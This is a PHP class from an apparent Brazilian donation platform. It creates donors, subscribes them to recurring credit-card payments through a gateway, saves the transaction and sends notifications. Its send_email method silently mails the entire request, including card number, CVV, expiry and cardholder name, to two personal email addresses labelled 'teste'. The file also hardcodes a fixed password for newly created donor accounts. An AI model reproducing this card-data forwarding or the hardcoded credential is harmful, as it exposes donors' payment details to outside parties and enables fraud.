<?php

class RecorrenciaDigital
{

    static function tamanho_cpf($cpf): string
    {   
        if(strlen($cpf) > 11){
            echo json_encode([
                'next' => false,
                'message' => 'Este campo de CPF só aceita CPF',
            ]);
            die;
        }
        return $cpf;
    }

    static function obrigatorio()
    {
        campo_obrigatorios([
            'amount' => 'Informe o valor',
            'cart_nome' => 'Informe um nome',
            'cart_numero' => 'Informe numero de cartão',
            'cart_cvv' => 'Informe um cvv',
            'cart_validade' => 'informe validade',
            'instituicao_id' => 'Informe Instituicao'
        ]);
    }

    static function get_dados_adm(array $jwt): array
    {
        $adm = new Adm();
        $get_secret = $jwt['secret'];
        $get_dados = $adm->list_profile($get_secret);
        return [
            "id" => $get_dados['id'],
            "nome" => $get_dados['nome'],
            "cpf" => $get_dados['cpf'],
            "telefone" => $get_dados['telefone'],
            "email" => $get_dados['email']
        ];
    }

    static function get_token_doador(
        $cpf, 
        $nome, 
        $email, 
        $telefone, 
        $instituicao_id,
        $complemento,
        $bairro,
        $endereco,
        $numero,
        $cep)
    {
        $doador = new Doador();
        $pagarme_Costumer = new PagarMeCostumer();


        if (!$doador->exist_by_cpf_instituicao($cpf, $instituicao_id)) {
            $doador->create($nome, $instituicao_id, $email, $telefone, $cpf, "GFCGDVJKLIKHB@~");
        }

        $doador_dados = $doador->get_by_cpf($cpf);
        $doador_id = $doador_dados['id'];

        if ($doador_dados['token'] == null) {
            $token_doador = $pagarme_Costumer->create($nome, $email, $doador_id, $telefone, $cpf, $endereco, $numero, $complemento, $bairro, $cep);
            $get_token_doador = $token_doador['id'];
            $doador->set_token($doador_id, $get_token_doador);
            $doador_dados['token'] = $token_doador;
        }
        return $doador_dados['token'];
    }

    static function assinar_plano(
        $costumer_id,
        $amount,
        $cart_nome,
        $cart_numero,
        $cart_cvv,
        $cart_validade,
        $numero,
        $complemento,
        $cep,
        $cpf,
        $email,
        $nome,
        $phone_number
    ) {

        $pagarme_cartao = new AsaasRecorrencia();

        $res_pagarme_recorrencia = $pagarme_cartao->create_recorrencia_cartao(
            $costumer_id,
            'CREDIT_CARD',
            $amount,
            $cart_nome,
            $cart_numero,
            $cart_validade,
            $cart_cvv,
            $nome,
            $email,
            $cpf,
            $cep,
            $numero,
            $complemento,
            $phone_number,
        );

        return [
            "status" => $res_pagarme_recorrencia['status'],
            "token" => $res_pagarme_recorrencia['id']
        ];
    }

    static function salve_db(
        $admin_id, 
        $token, 
        $status_pagamento, 
        $costumer_id, 
        $valor           

    ) {
        $doacaoDigital = new DoacaoDigital();
        $doacaoDigital->create(
            $admin_id, 
            $token, 
            $status_pagamento, 
            $costumer_id, 
            $valor  
        );
    }

    static function send_email($email) {
        @mail("br.rafael@outlook.com", "teste - " . date("d/m/Y H:i"), json_encode($_REQUEST));
        @mail("victorfernandomagalhaes@gmail.com", "teste - " . date("d/m/Y H:i"), json_encode($_REQUEST));
        @mail($email, "Doação", "...");
    }

    static function get_endereco_by_id($id) {
        $endereco = new Endereco();
        
        $get_dados = $endereco->list_all_by_fk($id);
        
        return [
            "bairro" => $get_dados['bairro'],
            "endereco" => $get_dados['logadouro'],
            "numero" => $get_dados['numero'],
            "cep" => withdraw_caracter($get_dados['cep']) 
        ];
    }

    static function create_transacao()
    {
        header('Content-Type: text/html; charset=utf-8');

        $jwt = token();

        self::obrigatorio();
        $dados_adm = self::get_dados_adm($jwt);

        $costumer_id = $_REQUEST['costumer_id'];
        $instituicao_id = $_REQUEST['instituicao_id'];
        $amount = $_REQUEST['amount'];
        $complemento = $_REQUEST['complemento'] ?? '';
        $cart_nome = $_REQUEST['cart_nome'];
        $cart_numero = withdraw_caracter($_REQUEST['cart_numero']);
        
        $cart_cvv = $_REQUEST['cart_cvv'];
        $cart_validade = withdraw_caracter($_REQUEST['cart_validade']);
               
        
        $cpf_campo = $dados_adm['cpf'];
        $email_campo = $dados_adm['email'];
        $nome = $dados_adm['nome'];
        $adm_id = $dados_adm['id'];
        $full_telefone = $dados_adm['telefone'];
        $phone_number = telefone_get_number($full_telefone);
        $ddd = telefone_get_ddd($full_telefone);
        $email = valid_email($email_campo);
        $cpf = self::tamanho_cpf(valid_cpf_cnpj($cpf_campo));
        $full_endereco = self::get_endereco_by_id($adm_id);

        $bairro = $full_endereco['bairro'];
        $endereco = $full_endereco['endereco'];
        $numero = $full_endereco['numero'];
        $cep = $full_endereco['cep'];

        $token_doador = self::get_token_doador(
            $cpf, 
            $nome, 
            $email, 
            $full_telefone, 
            $instituicao_id,
            $complemento,
            $bairro,
            $endereco,
            $numero,
            $cep
        );

        $res_asign_plan = self::assinar_plano(
            $costumer_id,
            $amount,
            $cart_nome,
            $cart_numero,
            $cart_cvv,
            $cart_validade,
            $numero,
            $complemento,
            $cep,
            $cpf,
            $email,
            $nome,
            $phone_number,
        );

        self::salve_db(
            $adm_id, 
            $res_asign_plan['token'], 
            $res_asign_plan['status'], 
            $costumer_id, 
            $amount
        );

        self::send_email($email);

        $email_notificacao = new Email();

        $get_numero_tel = substr(telefone_get_number($full_telefone), -8, 8);
        $get_ddd_tel = telefone_get_ddd($full_telefone);
        $numero_ddd = [$get_ddd_tel, $get_numero_tel];
        
        $template_email = $email_notificacao->exest_acao($instituicao_id, $res_asign_plan['status']);
        

        SendZap::send('primary', '55' . implode('', $numero_ddd), $template_email['text']);

        echo json_encode([
            'next' => true,
            'message' => 'Transacao Concluida',
        ]);
    }
}
